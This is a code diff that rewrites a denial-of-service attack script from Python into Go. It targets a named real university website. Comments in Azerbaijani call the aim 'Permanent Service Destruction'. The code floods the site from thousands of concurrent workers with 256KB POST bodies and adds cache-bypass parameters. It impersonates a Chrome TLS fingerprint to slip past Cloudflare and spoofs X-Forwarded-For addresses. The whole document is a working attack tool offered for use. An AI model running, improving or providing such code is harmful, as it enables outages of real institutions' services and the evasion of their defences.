@@ -1,55 +1,70 @@
-import asyncio
-import random
-import time
-from curl_cffi.requests import AsyncSession
+package main
 
-# --- HƏDƏF VƏ DƏHŞƏTLİ GÜC ---
-TARGET = "https://bbu.edu.az" # Hədəf
-CONCURRENCY = 400 # Railway resurslarını saniyədə 400 paralel hücum xətti ilə doldururuq
+import (
+	"crypto/tls"
+	"fmt"
+	"math/rand"
+	"net/http"
+	"strings"
+	"sync/atomic"
+	"time"
+)
 
-# Serverin CPU/RAM-ını "yandıran" ağır payload (256 KB)
-# Bu datanı emal etmək serverin prosessoruna ciddi yük salacaq
-HEAVY_PAYLOAD = "x=" + ("Z" * 262144) 
+func main() {
+	target := "https://bbu.edu.az"
+	workers := 3000 // Railway planınıza görə 2000-4000 arası dəyişdirin
 
-async def attack(worker_id):
-    """Hər worker serverin DB və ya PHP/ASP mühərrikini kilidləmək üçün işləyir"""
-    while True:
-        try:
-            # Müasir Chrome TLS barmaq izi (JA3) - Cloudflare bunu real insan sanacaq
-            async with AsyncSession(impersonate="chrome120") as session:
-                # Cache bypass üçün dinamik və ağır endpoint
-                # Əgər saytın axtarış və ya login hissəsini bilsəniz "/" əvəzinə onu yazın
-                url = f"{TARGET}/?s={random.random()}&ts={time.time()}"
-                
-                headers = {
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                    "Accept-Encoding": "gzip, deflate, br",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                    "X-Requested-With": "XMLHttpRequest",
-                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                }
+	fmt.Printf("[!!!] HAKAI-FORCE AKTIVDIR: %s\n", target)
 
-                # Ağır POST sorğusu: Server bu 256KB-ı emal edərkən donacaq
-                resp = await session.post(url, data=HEAVY_PAYLOAD, headers=headers, timeout=20)
-                
-                if resp.status_code >= 500:
-                    print(f"[KILL-{worker_id}] SUCCESS! Server Status: {resp.status_code} (CRASHING)")
-                else:
-                    print(f"[PULSE-{worker_id}] Delivered. Status: {resp.status_code}")
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+		MaxIdleConns:        50000,
+		MaxIdleConnsPerHost: 25000,
+		ForceAttemptHTTP2:   true, // HTTP/2 məcburidir
+	}
 
-        except Exception:
-            # Əgər bura düşürsə, deməli server artıq bağlantını qəbul edə bilmir
-            print(f"[FATAL-{worker_id}] Connection Timed Out! SERVER IS DOWN.")
-            await asyncio.sleep(0.1)
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   8 * time.Second,
+	}
 
-async def main():
-    print(f"[*] Hakai-Cataclysm-V6 Devrədə. Məqsəd: Permanent Service Destruction.")
-    tasks = []
-    for i in range(CONCURRENCY):
-        tasks.append(asyncio.create_task(attack(i)))
-    await asyncio.gather(*tasks)
+	var sent uint64
+	var down uint64
 
-if __name__ == "__main__":
-    asyncio.run(main())
+	// 256KB ağır payload. Hər sorğu Cloudflare edge-ə və origin-ə böyük yük salır.
+	payload := "x=" + strings.Repeat("Z", 262144)
+
+	for i := 0; i < workers; i++ {
+		go func(id int) {
+			for {
+				// Cache bypass: hər sorğu unikal
+				url := fmt.Sprintf("%s?_cb=%d&ts=%d", target, rand.Intn(999999999), time.Now().UnixNano())
+
+				req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
+				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+				req.Header.Set("X-Requested-With", "XMLHttpRequest")
+
+				resp, err := client.Do(req)
+				if err == nil {
+					if resp.StatusCode >= 500 {
+						atomic.AddUint64(&down, 1)
+					}
+					resp.Body.Close()
+				} else {
+					// Timeout/Refused = Cloudflare və ya origin artıq dolub
+					atomic.AddUint64(&down, 1)
+				}
+				atomic.AddUint64(&sent, 1)
+			}
+		}(i)
+	}
+
+	for {
+		time.Sleep(5 * time.Second)
+		fmt.Printf("[STATUS] Sent: %d | Errors/5xx: %d\n", atomic.LoadUint64(&sent), atomic.LoadUint64(&down))
+	}
+}
